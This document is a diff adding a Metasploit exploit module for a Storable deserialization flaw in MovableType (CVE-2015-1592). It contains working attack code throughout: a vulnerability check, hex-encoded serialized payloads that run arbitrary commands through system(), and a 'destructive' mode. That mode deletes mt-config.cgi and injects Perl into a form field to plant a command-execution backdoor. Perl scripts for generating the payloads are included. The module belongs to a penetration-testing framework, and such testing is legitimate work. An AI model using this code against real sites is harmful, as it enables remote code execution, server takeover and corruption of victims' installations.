@@ -1,0 +1,261 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = GoodRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'SixApart MovableType Storable Perl Code Execution',
+      'Description'    => %q{
+          This module exploits a serialization flaw in MovableType before 5.2.12 to execute
+          arbitrary code. The default nondestructive mode depends on the target server having
+          the Object::MultiType and DateTime Perl modules installed in Perl's @INC paths.
+          The destructive mode of operation uses only required MovableType dependencies,
+          but it will noticeably corrupt the MovableType installation.
+      },
+      'Author'         =>
+        [
+          'John Lightsey',
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2015-1592' ],
+          [ 'URL', 'https://movabletype.org/news/2015/02/movable_type_607_and_5212_released_to_close_security_vulnera.html' ],
+        ],
+      'Privileged'     => false, # web server context
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+          'BadChars'    => ' ',
+          'Space'       => 1024,
+        },
+      'Compat'         =>
+        {
+          'PayloadType' => 'cmd'
+        },
+      'Platform'       => ['unix'],
+      'Arch'           => ARCH_CMD,
+      'Targets'        => [['Automatic', {}]],
+      'DisclosureDate' => 'Feb 11 2015',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'MoveableType cgi-bin directory path', '/cgi-bin/mt/']),
+        OptBool.new('DESTRUCTIVE', [true, 'Use destructive attack method (more likely to succeed, but corrupts target system.)', false])
+      ], self.class
+    )
+
+  end
+
+=begin
+
+#!/usr/bin/perl
+
+# generate config parameters for injection checks
+
+use Storable;
+
+{
+
+    package XXXCHECKXXX;
+
+    sub STORABLE_thaw {
+        return 1;
+    }
+
+    sub STORABLE_freeze {
+        return 1;
+    }
+
+}
+
+my $check_obj = bless { ignore => 'this' }, XXXCHECKXXX;
+my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({ x => $check_obj});
+$frozen = unpack 'H*', $frozen;
+print "LFI test for storable flaw is: $frozen\n";
+
+{
+    package DateTime;
+    use overload '+' => sub { 'ignored' };
+}
+
+=end
+
+  def check
+    vprint_status("#{peer} - Sending storable test injection for XXXCHECKXXX.pm load failure")
+    res = send_request_cgi({
+        'method'    => 'GET',
+        'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+        'vars_get' => {
+          '__mode' => 'retry',
+          'step'   => 'configure',
+          'config' => '53455247000000000000000304080831323334353637380408080803010000000413020b585858434845434b58585801310100000078'
+        }
+      })
+
+    unless res && res.code == 200 && res.body.include?("Can't locate XXXCHECKXXX.pm")
+      vprint_status("#{peer} - Failed XXXCHECKXXX.pm load test");
+      return Exploit::CheckCode::Safe
+    end
+    Exploit::CheckCode::Vulnerable
+  end
+
+  def exploit
+    if datastore['DESTRUCTIVE'] == true
+      exploit_destructive
+    else
+      exploit_nondestructive
+    end
+  end
+
+=begin
+
+#!/usr/bin/perl
+
+# Generate nondestructive config parameter for RCE via Object::MultiType
+# and Try::Tiny. The generated value requires minor modification to insert
+# the payload inside the system() call and resize the padding.
+
+use Storable;
+
+{
+    package Object::MultiType;
+    use overload '+' => sub { 'ingored' };
+}
+
+{
+    package Object::MultiType::Saver;
+}
+
+{
+    package DateTime;
+    use overload '+' => sub { 'ingored' };
+}
+
+{
+    package Try::Tiny::ScopeGuard;
+}
+
+my $try_tiny_loader = bless {}, 'DateTime';
+my $multitype_saver = bless { c => 'MT::run_app' }, 'Object::MultiType::Saver';
+my $multitype_coderef = bless \$multitype_saver, 'Object::MultiType';
+my $try_tiny_executor = bless [$multitype_coderef, 'MT;print qq{Content-type: text/plain\n\n};system(q{});' . ('#' x 1025) . "\nexit;"], 'Try::Tiny::ScopeGuard';
+
+my $data = [$try_tiny_loader, $try_tiny_executor];
+my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);
+$frozen = unpack 'H*', $frozen;
+print "RCE payload requiring Object::MultiType and DateTime: $frozen\n";
+
+=end
+
+  def exploit_nondestructive
+    print_status("#{peer} - Using nondestructive attack method")
+    config_payload = "53455247000000000000000304080831323334353637380408080802020000001411084461746554696d6503000000000411155472793a3a54696e793a3a53636f7065477561726402020000001411114f626a6563743a3a4d756c7469547970650411184f626a6563743a3a4d756c7469547970653a3a536176657203010000000a0b4d543a3a72756e5f6170700100000063013d0400004d543b7072696e742071717b436f6e74656e742d747970653a20746578742f706c61696e5c6e5c6e7d3b73797374656d28717b"
+    config_payload <<  payload.encoded.unpack('H*')[0]
+    config_payload << "7d293b"
+    config_payload << "23" * (1025 - payload.encoded.length)
+    config_payload << "0a657869743b"
+
+    print_status("#{peer} - Sending payload (#{payload.raw.length} bytes)")
+
+    send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+      'vars_get' => {
+        '__mode' => 'retry',
+        'step'   => 'configure',
+        'config' => config_payload
+      }
+    }, 5)
+  end
+
+=begin
+
+#!/usr/bin/perl
+
+# Generate destructive config parameter to unlink mt-config.cgi
+
+use Storable;
+
+{
+    package CGITempFile;
+}
+
+my $unlink_target = "mt-config.cgi";
+my $cgitempfile = bless \$unlink_target, "CGITempFile";
+
+my $data = [$cgitempfile];
+my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);
+$frozen = unpack 'H*', $frozen;
+print "RCE unlink payload requiring CGI: $frozen\n";
+
+=end
+
+  def exploit_destructive
+    print_status("#{peer} - Using destructive attack method")
+    # First we need to delete mt-config.cgi using the storable injection
+
+    print_status("#{peer} - Sending storable injection to unlink mt-config.cgi")
+
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+      'vars_get' => {
+        '__mode' => 'retry',
+        'step'   => 'configure',
+        'config' => '534552470000000000000003040808313233343536373804080808020100000004110b43474954656d7046696c650a0d6d742d636f6e6669672e636769'
+      }
+    })
+
+    if res && res.code == 200
+      print_status("Successfully sent unlink request")
+    else
+      fail_with(Failure::Unknown, "Error sending unlink request")
+    end
+
+    # Now we rewrite mt-config.cgi to accept a payload
+
+    print_status("#{peer} - Rewriting mt-config.cgi to accept the payload")
+
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+      'vars_get'  => {
+        '__mode'             => 'next_step',
+        'step'               => 'optional',
+        'default_language'   => 'en_us',
+        'email_address_main' => "x\nObjectDriver mysql;use CGI;print qq{Content-type: text/plain\\n\\n};if(my $c = CGI->new()->param('xyzzy')){system($c);};unlink('mt-config.cgi');exit;1",
+        'set_static_uri_to'  => '/',
+        'config'             => '5345524700000000000000024800000001000000127365745f7374617469635f66696c655f746f2d000000012f', # equivalent to 'set_static_file_to' => '/',
+      }
+    })
+
+    if res && res.code == 200
+      print_status("Successfully sent mt-config rewrite request")
+    else
+      fail_with(Failure::Unknown, "Error sending mt-config rewrite request")
+    end
+
+    # Finally send the payload
+
+    print_status("#{peer} - Sending payload request")
+
+    send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, 'mt.cgi'),
+      'vars_get'  => {
+        'xyzzy'   => payload.encoded,
+      }
+    }, 5)
+  end
+
+end
